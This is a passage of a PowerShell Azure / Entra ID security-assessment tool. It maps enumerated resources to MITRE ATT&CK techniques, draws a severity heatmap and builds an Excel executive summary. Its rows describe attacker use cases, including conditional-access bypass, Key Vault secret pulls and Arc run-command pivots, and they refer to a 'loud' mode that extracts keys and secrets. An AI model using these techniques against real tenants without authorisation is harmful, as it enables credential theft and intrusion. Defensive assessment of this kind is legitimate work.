           Sev='High';     Id='T1556.009'; Tech='Modify Authentication Process: Conditional Access Policies'; Tac='Defense Evasion';
           Use='Disabled / report-only CA policies or broad exclusions = authentication gaps an attacker can aim at.';
           Det='Entra audit: Update/Disable conditionalAccessPolicy from non-IT identities.';
           Url='https://attack.mitre.org/techniques/T1556/009/' },
        @{ Cat='Named Locations';               Sheet='NamedLocations';             HVCount=(& $getWhere 'NamedLocations' { $_.IsTrusted -eq $true });
           Sev='Medium';   Id='T1556.009'; Tech='Modify Authentication Process: Conditional Access Policies'; Tac='Defense Evasion';
           Use='"Trusted" named locations bypass CA controls - add an attacker IP = permanent CA bypass.';
           Det='Entra audit: Add / Update namedLocation, especially setting isTrusted=true.';
           Url='https://attack.mitre.org/techniques/T1556/009/' },
        @{ Cat='Security Defaults';             Sheet='SecurityDefaults';           HVCount=(& $getWhere 'SecurityDefaults' { $_.IsEnabled -ne $true });
           Sev='Medium';   Id='T1556.006'; Tech='Modify Authentication Process: Multi-Factor Authentication'; Tac='Defense Evasion';
           Use='Security Defaults disabled without a CA MFA policy = no baseline MFA enforcement.';
           Det='Entra audit: Disable Security Defaults event.';
           Url='https://attack.mitre.org/techniques/T1556/006/' },
        @{ Cat='Authentication Methods Policy'; Sheet='AuthMethodsPolicies';        HVCount=(& $getWhere 'AuthMethodsPolicies' { $_.Method -match 'sms|voice' -and $_.State -eq 'enabled' });
           Sev='Medium';   Id='T1556.006'; Tech='Modify Authentication Process: Multi-Factor Authentication'; Tac='Defense Evasion';
           Use='SMS/voice MFA enabled = SIM-swap / call-forward bypass is in scope.';
           Det='Entra audit: Update authentication methods policy; legacy methods enabled.';
           Url='https://attack.mitre.org/techniques/T1556/006/' },
        @{ Cat='MFA Registration State';        Sheet='MFAStatus';                  HVCount=(& $getWhere 'MFAStatus' { $_.IsMfaRegistered -ne $true });
           Sev='High';     Id='T1556.006'; Tech='Modify Authentication Process: Multi-Factor Authentication'; Tac='Defense Evasion';
           Use='Users without MFA registered = password-spray / AiTM targets with zero friction.';
           Det='Sign-in logs: successful non-interactive sign-ins without MFA claim.';
           Url='https://attack.mitre.org/techniques/T1556/006/' },
        @{ Cat='NSGs (Network Security Groups)'; Sheet='NSGs';                      HVCount=0;
           Sev='Info';     Id='T1562.007'; Tech='Impair Defenses: Disable or Modify Cloud Firewall';      Tac='Defense Evasion';
           Use='Full NSG inventory - needed to reason about blast radius of a risky rule.';
           Det='ARM: Microsoft.Network/networkSecurityGroups/write events.';
           Url='https://attack.mitre.org/techniques/T1562/007/' },
        @{ Cat='Risky NSG Rules (inbound from Internet)'; Sheet='NSGRules';         HVCount=(& $getWhere 'NSGRules' { $_.RiskyService -and $_.RiskyService -ne '' });
           Sev='Critical'; Id='T1562.007'; Tech='Impair Defenses: Disable or Modify Cloud Firewall';      Tac='Defense Evasion';
           Use='Inbound Allow from 0.0.0.0/0 on RDP / SSH / SMB / WinRM / SQL = direct attack surface.';
           Det='Azure Activity: NSG rule writes permitting Internet source on admin ports; Defender for Cloud alerts.';
           Url='https://attack.mitre.org/techniques/T1562/007/' },
        @{ Cat='App Services';                  Sheet='AppServices';                HVCount=0;
           Sev='Medium';   Id='T1578';     Tech='Modify Cloud Compute Infrastructure';                    Tac='Defense Evasion';
           Use='App Services can be modified (scale, SCM) to drop attacker code or disable logging.';
           Det='Azure Activity: Microsoft.Web/sites/config write + publishing credentials operations.';
           Url='https://attack.mitre.org/techniques/T1578/' },

        # --- Credential Access ---------------------------------------------------
        @{ Cat='Key Vaults';                    Sheet='KeyVaults';                  HVCount=(& $getWhere 'KeyVaults' { $_.PublicNetworkAccess -eq 'Enabled' -or $_.PublicNetworkAccess -eq $null });
           Sev='Critical'; Id='T1555.006'; Tech='Credentials from Password Stores: Cloud Secrets Management Stores'; Tac='Credential Access';
           Use='KVs store every downstream app credential - RBAC/Access Policy + public endpoint = game over.';
           Det='Key Vault audit: Get/List on Secrets/Keys/Certs at anomalous volume; data-plane reads from new identities.';
           Url='https://attack.mitre.org/techniques/T1555/006/' },
        @{ Cat='Storage Accounts';              Sheet='StorageAccounts';            HVCount=(& $getWhere 'StorageAccounts' { $_.AllowBlobPublicAccess -eq $true });
           Sev='High';     Id='T1530';     Tech='Data from Cloud Storage';                                Tac='Collection';
           Use='Public-blob storage = credentials, backups, and PII routinely ship here by accident.';
           Det='Storage logs: anonymous blob reads; Defender for Storage "Publicly accessible storage".';
           Url='https://attack.mitre.org/techniques/T1530/' },
        @{ Cat='Automation Accounts';           Sheet='AutomationAccounts';         HVCount=0;
           Sev='High';     Id='T1552.005'; Tech='Unsecured Credentials: Cloud Instance Metadata API';     Tac='Credential Access';
           Use='Automation accounts store runbook variables and often carry a Run-As identity - a single read can yield secrets.';
           Det='Azure Activity: listKeys / getJobOutput on automationAccounts from unusual principals.';
           Url='https://attack.mitre.org/techniques/T1552/005/' },

        # --- Execution -----------------------------------------------------------
        @{ Cat='Automation Accounts (Execution)'; Sheet='AutomationAccounts';       HVCount=0;
           Sev='Medium';   Id='T1053.007'; Tech='Scheduled Task/Job: Container Orchestration Job';        Tac='Execution';
           Use='Hybrid Runbook Workers + schedule = cloud-native scheduled execution with identity attached.';
           Det='Azure Activity: runbook publish/start events; new schedule bindings to sensitive runbooks.';
           Url='https://attack.mitre.org/techniques/T1053/007/' },

        # --- MicroBurst-inspired: External attack surface --------------------
        @{ Cat='External Subdomains (DNS-resolvable)'; Sheet='ExternalSubdomains';   HVCount=(& $getWhere 'ExternalSubdomains' { $_.Service -in @('KeyVault','AzureSQL','CosmosDB','AppService-Kudu','Storage-Blob') });
           Sev='High';     Id='T1590.002'; Tech='Gather Victim Network Information: DNS';                 Tac='Reconnaissance';
           Use='Unauth DNS sweep of Azure service suffixes reveals the tenant''s externally-addressable footprint (App Svc, Key Vault, SQL, etc.).';
           Det='Defender EASM-style telemetry; abnormal external DNS probing against *.core.windows.net, *.vault.azure.net, etc. (seen at the resolver, not in Azure logs).';
           Url='https://attack.mitre.org/techniques/T1590/002/' },
        @{ Cat='External Subdomains (Cloud Svc Discovery)'; Sheet='ExternalSubdomains'; HVCount=0;
           Sev='Medium';   Id='T1596.002'; Tech='Search Open Technical Databases: DNS/Passive DNS';       Tac='Reconnaissance';
           Use='The resolved FQDNs themselves become a low-cost asset inventory for an external attacker without any Azure credential.';
           Det='Passive DNS correlation; certificate transparency monitoring for the tenant''s domains.';
           Url='https://attack.mitre.org/techniques/T1596/002/' },
        @{ Cat='Public Blob Containers';         Sheet='ExternalBlobs';              HVCount=(& $getWhere 'ExternalBlobs' { $_.PublicAccess -eq 'Container' });
           Sev='Critical'; Id='T1530';     Tech='Data from Cloud Storage';                                Tac='Collection';
           Use='Anonymous-accessible containers frequently hold backups, build artifacts, or CI/CD secrets.';
           Det='Defender for Storage: "Publicly accessible storage container"; anonymous GET / LIST at the storage log layer.';
           Url='https://attack.mitre.org/techniques/T1530/' },
        @{ Cat='External Attack Surface Summary'; Sheet='ExternalAttackSurfaceSummary'; HVCount=0;
           Sev='Info';     Id='T1580';     Tech='Cloud Infrastructure Discovery';                         Tac='Discovery';
           Use='Tactic-level rollup of what unauth recon produced - directly feeds target prioritization.';
           Det='N/A - this is operator-side aggregation.';
           Url='https://attack.mitre.org/techniques/T1580/' },

        # --- MicroBurst-inspired: Credential-storage audit --------------------
        @{ Cat='Credential Exposure (all sources)'; Sheet='CredentialExposure';      HVCount=(& $getWhere 'CredentialExposure' { $_.Severity -in @('Critical','High') });
           Sev='Critical'; Id='T1552.001'; Tech='Unsecured Credentials: Credentials In Files';            Tac='Credential Access';
           Use='Names-only inventory of every credential-storage location (Automation vars/creds, KV secrets/keys/certs, AKS admin creds, App Svc publishing creds).';
           Det='KV data-plane listKeys/listSecrets; ARM listKeys on Automation; publishxml pulls on App Service.';
           Url='https://attack.mitre.org/techniques/T1552/001/' },
        @{ Cat='Credential Exposure (Cloud Mgmt)';   Sheet='CredentialExposure';      HVCount=(& $getWhere 'CredentialExposure' { $_.ResourceType -like 'KeyVault/*' });
           Sev='High';     Id='T1555.006'; Tech='Credentials from Password Stores: Cloud Secrets Management Stores'; Tac='Credential Access';
           Use='KeyVault-resident credentials visible by name - a roadmap for a follow-up loud secret-pull.';
           Det='KeyVault audit logs: SecretList / KeyList / CertificateList at elevated volume or from unusual principals.';
           Url='https://attack.mitre.org/techniques/T1555/006/' },

        # --- MicroBurst-inspired: Azure Arc hybrid inventory ------------------
        @{ Cat='Arc Hybrid Machines';           Sheet='ArcMachines';                 HVCount=(& $getWhere 'ArcMachines' { $_.Status -eq 'Connected' });
           Sev='High';     Id='T1078.004'; Tech='Valid Accounts: Cloud Accounts';                         Tac='Defense Evasion';
           Use='Arc-connected on-prem servers accept runCommand through ARM with a Managed Identity - a cloud-to-on-prem pivot with no VPN needed.';
           Det='Activity log: Microsoft.HybridCompute/machines/runCommands/action; correlate with new runbook or principal activity.';
           Url='https://attack.mitre.org/techniques/T1078/004/' },
        @{ Cat='Arc Hybrid Machines (Discovery)'; Sheet='ArcMachines';               HVCount=0;
           Sev='Info';     Id='T1580';     Tech='Cloud Infrastructure Discovery';                         Tac='Discovery';
           Use='Inventory of Arc-connected machines is the fastest way to map a hybrid estate from Azure-only footholds.';
           Det='Activity log: Microsoft.HybridCompute/machines/read volume from a single identity.';
           Url='https://attack.mitre.org/techniques/T1580/' },
        @{ Cat='Arc VM Extensions';             Sheet='ArcExtensions';               HVCount=(& $getWhere 'ArcExtensions' { $_.Type -in @('CustomScript','CustomScriptExtension','RunCommandWindows','RunCommandLinux') });
           Sev='High';     Id='T1059.009'; Tech='Command and Scripting Interpreter: Cloud API';            Tac='Execution';
           Use='Custom-script / run-command extensions already in place on Arc machines are a ready-made code-exec surface.';
           Det='ARM: create/update of extensions of type CustomScript* on HybridCompute machines.';
           Url='https://attack.mitre.org/techniques/T1059/009/' },
        @{ Cat='Arc-connected Kubernetes';      Sheet='ArcKubernetes';               HVCount=0;
           Sev='High';     Id='T1613';     Tech='Container and Resource Discovery';                       Tac='Discovery';
           Use='Arc K8s clusters expose listClusterUserCredential - a short path from Azure RBAC to kubeconfig.';
           Det='Activity log: Microsoft.Kubernetes/connectedClusters/listClusterUserCredential/action events.';
           Url='https://attack.mitre.org/techniques/T1613/' },
        @{ Cat='Arc SQL Instances';             Sheet='ArcSqlInstances';             HVCount=0;
           Sev='Medium';   Id='T1213';     Tech='Data from Information Repositories';                     Tac='Collection';
           Use='SQL-on-Arc instances ride on the Arc agent - if the host is reachable, so is the DB.';
           Det='Arc agent connectivity + SQL audit on-host.';
           Url='https://attack.mitre.org/techniques/T1213/' },

        # --- Loud mode (only populated when option L runs) -------------------
        @{ Cat='LOUD: Storage Access Keys';     Sheet='LoudStorageKeys';             HVCount=(& $getWhere 'LoudStorageKeys' { $_.KeyName -ne 'ERROR' });
           Sev='Critical'; Id='T1552.005'; Tech='Unsecured Credentials: Cloud Instance Metadata API';     Tac='Credential Access';
           Use='Full R/W storage keys retrieved via listKeys. Gives anonymous-equivalent access to everything the account holds.';
           Det='Activity log: Microsoft.Storage/storageAccounts/listKeys/action - very noisy and easy to alert on.';
           Url='https://attack.mitre.org/techniques/T1552/005/' },
        @{ Cat='LOUD: Key Vault Secret Values'; Sheet='LoudKeyVaultSecrets';         HVCount=(& $getWhere 'LoudKeyVaultSecrets' { $_.Value -and $_.Value -notlike '*ERROR*' });
           Sev='Critical'; Id='T1555.006'; Tech='Credentials from Password Stores: Cloud Secrets Management Stores'; Tac='Credential Access';
           Use='Actual secret values pulled from KV - downstream app compromise typically follows immediately.';
           Det='KV audit: SecretGet at elevated volume; SOAR playbooks should auto-rotate on exfil pattern.';
           Url='https://attack.mitre.org/techniques/T1555/006/' },
        @{ Cat='LOUD: Automation Credentials (flagged)'; Sheet='LoudAutomationCreds'; HVCount=0;
           Sev='High';     Id='T1552.001'; Tech='Unsecured Credentials: Credentials In Files';            Tac='Credential Access';
           Use='Flagged for manual runbook-based extraction - values are retrievable by any runbook in the Automation account.';
           Det='New runbooks created + output stream containing credential-shaped strings.';
           Url='https://attack.mitre.org/techniques/T1552/001/' },
        @{ Cat='LOUD: Command Execution Results'; Sheet='LoudCommandExecution';      HVCount=(& $getWhere 'LoudCommandExecution' { $_.Output -and $_.Output -notlike '*ERROR*' });
           Sev='Critical'; Id='T1651';     Tech='Cloud Administration Command';                           Tac='Execution';
           Use='VM/App-Service runCommand execution - cloud-native RCE through ARM.';
           Det='Activity log: Microsoft.Compute/virtualMachines/runCommand/action; alert on frequency & non-standard principals.';
           Url='https://attack.mitre.org/techniques/T1651/' }
    )

    foreach ($r in $rows) {
        $count = (& $getCount $r.Sheet)
        # Only emit rows for sheets that actually contain data. Keeps the threat
        # map honest - reviewer doesn't see "Count=0" noise for scopes that
        # weren't enumerated or the identity lacked permission for.
        if ($count -le 0) { continue }

        $null = $Report.MITREThreatMap.Add([PSCustomObject]@{
            Category           = $r.Cat
            SourceWorksheet    = $r.Sheet
            Count              = $count
            HighValueCount     = [int]$r.HVCount
            Severity           = $r.Sev
            MitreId            = $r.Id
            MitreTechnique     = $r.Tech
            Tactic             = $r.Tac
            AttackerUseCase    = $r.Use
            SuggestedDetection = $r.Det
            ReferenceURL       = $r.Url
        })
    }

    Write-Host "    MITRE threat-map rows: $($Report.MITREThreatMap.Count)" -ForegroundColor Cyan
}

# -----------------------------------------------------------------------------
# New-MITREThreatMapGraphImage
#
# Generates a MITRE ATT&CK Navigator-style heatmap PNG from the MITREThreatMap
# rows. One column per Tactic, one colored cell per technique mapped into that
# tactic. Cell color = severity; cell text = MitreId + technique name + live
# counts. Produces a PNG the caller can embed in an Excel worksheet.
#
# Uses System.Drawing which ships with Windows PowerShell 5.1 natively. On PS7
# on Windows it still works because System.Drawing.Common is available out of
# the box on Windows hosts. Function throws on failure so the caller can fall
# back cleanly.
# -----------------------------------------------------------------------------
function New-MITREThreatMapGraphImage {
    param(
        [Parameter(Mandatory=$true)][string]$OutputImagePath
    )

    Add-Type -AssemblyName System.Drawing -ErrorAction Stop

    if ($Report.MITREThreatMap.Count -eq 0) {
        throw "MITREThreatMap is empty - nothing to render."
    }

    # Group techniques by tactic in a sensible attack-lifecycle order (rather
    # than alphabetical) so the image reads left-to-right like an attacker
    # would move through a kill chain.
    $tacticOrder = @(
        'Reconnaissance','Resource Development','Initial Access','Execution',
        'Persistence','Privilege Escalation','Defense Evasion','Credential Access',
        'Discovery','Lateral Movement','Collection','Command and Control',
        'Exfiltration','Impact'
    )
    $byTactic = $Report.MITREThreatMap | Group-Object Tactic
    $orderedTactics = @()
    foreach ($t in $tacticOrder) {
        $grp = $byTactic | Where-Object { $_.Name -eq $t }
        if ($grp) { $orderedTactics += $grp }
    }
    # Any tactic we didn't list in $tacticOrder gets appended at the end so
    # future additions aren't silently dropped from the graphic.
    foreach ($g in $byTactic) {
        if ($orderedTactics -notcontains $g) { $orderedTactics += $g }
    }

    # Layout constants (tuned for a ~2000x1100 image that prints legibly at
    # full width on a 16:9 slide).
    $colWidth      = 230
    $cellHeight    = 72
    $headerHeight  = 54
    $titleHeight   = 90
    $legendHeight  = 46
    $margin        = 24
    $colGap        = 10

    $maxRowsInCol = 0
    foreach ($t in $orderedTactics) {
        if ($t.Count -gt $maxRowsInCol) { $maxRowsInCol = $t.Count }
    }
    if ($maxRowsInCol -lt 1) { $maxRowsInCol = 1 }

    $imgWidth  = ($orderedTactics.Count * $colWidth) + (2 * $margin)
    $imgHeight = $titleHeight + $headerHeight + ($maxRowsInCol * $cellHeight) + $legendHeight + (2 * $margin)

    # Surface and graphics context
    $bmp = New-Object System.Drawing.Bitmap $imgWidth, $imgHeight
    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.SmoothingMode     = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $gfx.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::ClearTypeGridFit
    $gfx.Clear([System.Drawing.Color]::FromArgb(245, 246, 249))

    # Fonts
    $titleFont    = New-Object System.Drawing.Font 'Segoe UI', 22, ([System.Drawing.FontStyle]::Bold)
    $subtitleFont = New-Object System.Drawing.Font 'Segoe UI', 10, ([System.Drawing.FontStyle]::Italic)
    $headerFont   = New-Object System.Drawing.Font 'Segoe UI', 11, ([System.Drawing.FontStyle]::Bold)
    $idFont       = New-Object System.Drawing.Font 'Consolas', 9,  ([System.Drawing.FontStyle]::Bold)
    $techFont     = New-Object System.Drawing.Font 'Segoe UI', 9,  ([System.Drawing.FontStyle]::Bold)
    $countFont    = New-Object System.Drawing.Font 'Segoe UI', 8
    $legendFont   = New-Object System.Drawing.Font 'Segoe UI', 9,  ([System.Drawing.FontStyle]::Bold)

    $darkBrush  = New-Object System.Drawing.SolidBrush ([System.Drawing.Color]::FromArgb(24, 32, 60))
    $whiteBrush = [System.Drawing.Brushes]::White
    $blackBrush = [System.Drawing.Brushes]::Black
    $gridPen    = New-Object System.Drawing.Pen ([System.Drawing.Color]::FromArgb(70, 70, 90)), 1

    # Severity -> color helper
    $severityColor = {
        param($sev)
        switch ($sev) {
            'Critical' { [System.Drawing.Color]::FromArgb(198, 40, 40) }   # deep red
            'High'     { [System.Drawing.Color]::FromArgb(244, 110, 40) }  # orange
            'Medium'   { [System.Drawing.Color]::FromArgb(240, 196, 64) }  # gold
            'Low'      { [System.Drawing.Color]::FromArgb(120, 180, 90) }  # green
            'Info'     { [System.Drawing.Color]::FromArgb(150, 160, 175) } # gray
            default    { [System.Drawing.Color]::FromArgb(200, 200, 210) }
        }
    }

    # --- Title block ---------------------------------------------------------
    $gfx.DrawString("MITRE ATT&CK - Azure / Entra ID T1526 Enumeration Coverage",
        $titleFont, $darkBrush, [single]$margin, [single]$margin)
    $subtitle = "Tenant: $ResolvedTenant   /   Run: $Timestamp   /   Cells colored by severity; text = MitreId + Technique + Count / HighValue"
    $gfx.DrawString($subtitle, $subtitleFont, $darkBrush, [single]$margin, [single]($margin + 44))

    # --- Columns -------------------------------------------------------------
    $x  = $margin
    $y0 = $margin + $titleHeight
    foreach ($t in $orderedTactics) {
        # Tactic header band
        $headerRect = New-Object System.Drawing.Rectangle $x, $y0, ($colWidth - $colGap), $headerHeight
        $gfx.FillRectangle((New-Object System.Drawing.SolidBrush ([System.Drawing.Color]::FromArgb(30, 45, 90))), $headerRect)
        $sf = New-Object System.Drawing.StringFormat
        $sf.Alignment     = [System.Drawing.StringAlignment]::Center
        $sf.LineAlignment = [System.Drawing.StringAlignment]::Center
        $gfx.DrawString($t.Name, $headerFont, $whiteBrush, ([System.Drawing.RectangleF]$headerRect), $sf)

        # Sort techniques in the column by severity so Critical items float up
        $techs = $t.Group | Sort-Object @{Expression = {
            switch ($_.Severity) {
                'Critical' { 0 }
                'High'     { 1 }
                'Medium'   { 2 }
                'Low'      { 3 }
                'Info'     { 4 }
                default    { 5 }
            }
        }}, MitreId

        $cy = $y0 + $headerHeight + 4
        foreach ($tech in $techs) {
            $cellRect = New-Object System.Drawing.Rectangle $x, $cy, ($colWidth - $colGap), ($cellHeight - 4)
            $cellColor = & $severityColor $tech.Severity
            $gfx.FillRectangle((New-Object System.Drawing.SolidBrush $cellColor), $cellRect)
            $gfx.DrawRectangle($gridPen, $cellRect)

            # Pick readable text color based on the fill's luminance
            $luma = ($cellColor.R * 0.299) + ($cellColor.G * 0.587) + ($cellColor.B * 0.114)
            $textBrush = if ($luma -lt 145) { $whiteBrush } else { $blackBrush }

            # MitreId (top-left, monospace for that "tech" look)
            $gfx.DrawString(
                $tech.MitreId,
                $idFont, $textBrush,
                [single]($x + 8), [single]($cy + 6))

            # Technique name (wrapped, middle)
            $nameRect = New-Object System.Drawing.RectangleF `
                ([single]($x + 8)), ([single]($cy + 22)), `
                ([single]($colWidth - $colGap - 16)), ([single]($cellHeight - 46))
            $techName = $tech.MitreTechnique
            if ($techName.Length -gt 70) { $techName = $techName.Substring(0, 67) + '...' }
            $gfx.DrawString($techName, $techFont, $textBrush, $nameRect)

            # Count / HighValue footer (bottom)
            $countText = "Count: $($tech.Count)   HV: $($tech.HighValueCount)"
            $gfx.DrawString(
                $countText,
                $countFont, $textBrush,
                [single]($x + 8), [single]($cy + $cellHeight - 20))

            $cy += $cellHeight
        }

        $x += $colWidth
    }

    # --- Legend --------------------------------------------------------------
    $legendY = $imgHeight - $legendHeight - $margin + 12
    $lx = $margin
    $gfx.DrawString("Severity legend:", $legendFont, $darkBrush, [single]$lx, [single]$legendY)
    $lx += 130
    foreach ($sev in @('Critical','High','Medium','Low','Info')) {
        $chip = New-Object System.Drawing.Rectangle $lx, ($legendY + 1), 22, 16
        $gfx.FillRectangle((New-Object System.Drawing.SolidBrush (& $severityColor $sev)), $chip)
        $gfx.DrawRectangle([System.Drawing.Pens]::Black, $chip)
        $gfx.DrawString($sev, $legendFont, $darkBrush, [single]($lx + 28), [single]$legendY)
        $lx += 110
    }

    # Save PNG
    try {
        $bmp.Save($OutputImagePath, [System.Drawing.Imaging.ImageFormat]::Png)
    } finally {
        $gfx.Dispose()
        $bmp.Dispose()
    }
}

# -----------------------------------------------------------------------------
# Add-ExecutiveSummarySheet
#
# Builds an "Executive Summary" worksheet inside an already-opened EPPlus
# package ($Pkg). Intended as the #2 tab (right after the visual Graph tab).
# Contents:
#   - Title banner
#   - KPI card row (5 metrics)
#   - Pie chart: Severity distribution across all MITRE technique mappings
#   - Column chart: Finding count per ATT&CK tactic
#   - Top High-Value Findings table (sorted Critical -> High -> Medium)
#   - Pie chart: Identity attack surface (Users / Guests / SPNs / Apps / Groups)
#   - Bar chart: High-Value count per category (top 10)
#   - Key Vulnerability Alerts bullet list
#   - Recommendations bullet list
#
# Chart source data is written into columns Q..T so the visible left portion
# stays clean; those columns are hidden at the end of the function.
# -----------------------------------------------------------------------------
function Add-ExecutiveSummarySheet {
    param([Parameter(Mandatory=$true)]$Pkg)

    Write-Host "    [*] Building Executive Summary tab..." -ForegroundColor Yellow

    # Idempotent reruns
    $existing = $Pkg.Workbook.Worksheets | Where-Object { $_.Name -eq 'Executive Summary' }
    if ($existing) { $Pkg.Workbook.Worksheets.Delete('Executive Summary') }

    $ws = $Pkg.Workbook.Worksheets.Add('Executive Summary')
    $ws.View.ShowGridLines = $false

    # Column widths (visible area A..N, data area Q..T)
    1..14 | ForEach-Object { $ws.Column($_).Width = 16 }
    17..20 | ForEach-Object { $ws.Column($_).Width = 24 }

    # Colors
    $navy     = [System.Drawing.Color]::FromArgb(30, 45, 90)
    $slate    = [System.Drawing.Color]::FromArgb(60, 72, 110)
    $critRed  = [System.Drawing.Color]::FromArgb(198, 40, 40)
    $highOrg  = [System.Drawing.Color]::FromArgb(244, 110, 40)
    $medGold  = [System.Drawing.Color]::FromArgb(230, 180, 50)
    $lowGrn   = [System.Drawing.Color]::FromArgb(120, 180, 90)
    $infoGry  = [System.Drawing.Color]::FromArgb(150, 160, 175)
    $bluKpi   = [System.Drawing.Color]::FromArgb(55, 95, 170)
    $purKpi   = [System.Drawing.Color]::FromArgb(100, 70, 160)
    $white    = [System.Drawing.Color]::White

    # --- TITLE BANNER -------------------------------------------------------
    $ws.Cells['A1:N2'].Merge = $true
    $ws.Cells['A1'].Value = "EXECUTIVE SUMMARY  -  MITRE T1526 Azure / Entra ID Enumeration"
    $ws.Cells['A1'].Style.Font.Size  = 20
    $ws.Cells['A1'].Style.Font.Bold  = $true
    $ws.Cells['A1'].Style.Font.Color.SetColor($white)
    $ws.Cells['A1'].Style.Fill.PatternType = [OfficeOpenXml.Style.ExcelFillStyle]::Solid
    $ws.Cells['A1'].Style.Fill.BackgroundColor.SetColor($navy)
    $ws.Cells['A1'].Style.HorizontalAlignment = [OfficeOpenXml.Style.ExcelHorizontalAlignment]::Center
    $ws.Cells['A1'].Style.VerticalAlignment   = [OfficeOpenXml.Style.ExcelVerticalAlignment]::Center
    $ws.Row(1).Height = 26; $ws.Row(2).Height = 24

    $ws.Cells['A3:N3'].Merge = $true
    $ws.Cells['A3'].Value = "Tenant: $ResolvedTenant   |   Run: $(Get-Date -Format 'yyyy-MM-dd HH:mm')   |   Operator: $OperatorUpn   |   Scope: option $Choice"
    $ws.Cells['A3'].Style.Font.Italic = $true
    $ws.Cells['A3'].Style.HorizontalAlignment = [OfficeOpenXml.Style.ExcelHorizontalAlignment]::Center

    # --- KPI CARDS (row 5-7) ------------------------------------------------
    $critCount = @($Report.MITREThreatMap | Where-Object { $_.Severity -eq 'Critical' }).Count
    $highCount = @($Report.MITREThreatMap | Where-Object { $_.Severity -eq 'High' }).Count
    $dangerousPerms = @($Report.AppPermissions | Where-Object { $_.IsDangerous }).Count
    $idCount   = $Report.Users.Count + $Report.ServicePrincipals.Count + $Report.AppRegistrations.Count

    # MicroBurst-derived KPIs
    $externalSurfaceCount = $Report.ExternalSubdomains.Count + $Report.ExternalBlobs.Count
    $credExposureCount    = $Report.CredentialExposure.Count
    $arcCount             = $Report.ArcMachines.Count + $Report.ArcKubernetes.Count + $Report.ArcSqlInstances.Count

    $kpis = @(
        [ordered]@{ Range='A5:B7'; Label='SUBSCRIPTIONS';   Value=$Report.Subscriptions.Count; Sub='Azure';                Fill=$bluKpi }
        [ordered]@{ Range='D5:E7'; Label='IDENTITIES';      Value=$idCount;                    Sub='Users + SPNs + Apps';  Fill=$slate  }
        [ordered]@{ Range='G5:H7'; Label='CRITICAL FINDINGS'; Value=$critCount;                Sub='MITRE categories';     Fill=$critRed }
        [ordered]@{ Range='J5:K7'; Label='HIGH FINDINGS';   Value=$highCount;                  Sub='MITRE categories';     Fill=$highOrg }
        [ordered]@{ Range='M5:N7'; Label='DANGEROUS PERMS'; Value=$dangerousPerms;             Sub='IsDangerous = true';   Fill=$purKpi  }
    )

    # If MicroBurst-inspired modules produced data, add a second row of KPIs (rows 8-10)
    $microBurstKpis = @()
    if ($externalSurfaceCount -gt 0 -or $credExposureCount -gt 0 -or $arcCount -gt 0 -or $Report.LoudKeyVaultSecrets.Count -gt 0) {
        $microBurstKpis = @(
            [ordered]@{ Range='A8:B10'; Label='EXTERNAL SURFACE'; Value=$externalSurfaceCount;    Sub='Subdomains + Public Blobs'; Fill=$highOrg }
            [ordered]@{ Range='D8:E10'; Label='CREDENTIAL STORES';Value=$credExposureCount;       Sub='Names-only audit';           Fill=$purKpi  }
            [ordered]@{ Range='G8:H10'; Label='ARC HYBRID';       Value=$arcCount;                Sub='Machines+K8s+SQL';           Fill=$bluKpi  }
            [ordered]@{ Range='J8:K10'; Label='LOUD: KV SECRETS'; Value=$Report.LoudKeyVaultSecrets.Count; Sub='Values pulled';   Fill=$critRed }
            [ordered]@{ Range='M8:N10'; Label='LOUD: STORAGE KEYS'; Value=$Report.LoudStorageKeys.Count; Sub='Values pulled';      Fill=$critRed }
        )
    }
    $renderKpiCard = {
        param($k)
        $cells = $ws.Cells[$k.Range]
        $cells.Merge = $true
        $cells.Style.Fill.PatternType = [OfficeOpenXml.Style.ExcelFillStyle]::Solid
        $cells.Style.Fill.BackgroundColor.SetColor($k.Fill)
        $cells.Style.Font.Color.SetColor($white)
        $cells.Style.HorizontalAlignment = [OfficeOpenXml.Style.ExcelHorizontalAlignment]::Center
        $cells.Style.VerticalAlignment   = [OfficeOpenXml.Style.ExcelVerticalAlignment]::Center
        $cells.Value = "$($k.Label)`r`n$($k.Value)`r`n$($k.Sub)"
        $cells.Style.WrapText = $true
        $cells.Style.Font.Size = 11
        $cells.Style.Font.Bold = $true
    }

    foreach ($k in $kpis) { & $renderKpiCard $k }
    $ws.Row(5).Height = 20; $ws.Row(6).Height = 30; $ws.Row(7).Height = 18

    # Second row of KPIs reserved for MicroBurst-inspired modules
    $sectionHeaderStart = 9   # default: section header goes on row 9
    if ($microBurstKpis.Count -gt 0) {
        foreach ($k in $microBurstKpis) { & $renderKpiCard $k }
        $ws.Row(8).Height = 20; $ws.Row(9).Height = 30; $ws.Row(10).Height = 18
        $sectionHeaderStart = 12  # push the MITRE header below the second KPI row
    }

    # --- SECTION HEADER ------------------------------------------------------
    $sectionHeader = {
        param($cell, $text)
        $rng = $ws.Cells[$cell]
        $rng.Merge = $true
        $rng.Value = $text
        $rng.Style.Font.Size = 13
        $rng.Style.Font.Bold = $true
        $rng.Style.Font.Color.SetColor($white)
        $rng.Style.Fill.PatternType = [OfficeOpenXml.Style.ExcelFillStyle]::Solid
        $rng.Style.Fill.BackgroundColor.SetColor($slate)
        $rng.Style.HorizontalAlignment = [OfficeOpenXml.Style.ExcelHorizontalAlignment]::Center
        $rng.Style.VerticalAlignment   = [OfficeOpenXml.Style.ExcelVerticalAlignment]::Center
    }

    & $sectionHeader ("A$sectionHeaderStart`:N$sectionHeaderStart") 'MITRE ATT&CK COVERAGE'
    $ws.Row($sectionHeaderStart).Height = 22

    # --- CHART DATA BLOCK 1 (columns Q..R) -----------------------------------
    # Severity distribution
    $ws.Cells['Q1'].Value = 'Severity'; $ws.Cells['R1'].Value = 'Count'
    $ws.Cells['Q1:R1'].Style.Font.Bold = $true
    $severityData = @(
        @{ Name='Critical'; Count=$critCount }
        @{ Name='High';     Count=$highCount }
        @{ Name='Medium';   Count=(@($Report.MITREThreatMap | Where-Object { $_.Severity -eq 'Medium' }).Count) }
        @{ Name='Low';      Count=(@($Report.MITREThreatMap | Where-Object { $_.Severity -eq 'Low' }).Count) }
        @{ Name='Info';     Count=(@($Report.MITREThreatMap | Where-Object { $_.Severity -eq 'Info' }).Count) }
    )
    $r = 2
    foreach ($s in $severityData) {
        $ws.Cells["Q$r"].Value = $s.Name; $ws.Cells["R$r"].Value = [int]$s.Count
        $r++
    }
    $sevEndRow = $r - 1

    # Tactic counts
    $tacticStart = $r + 1
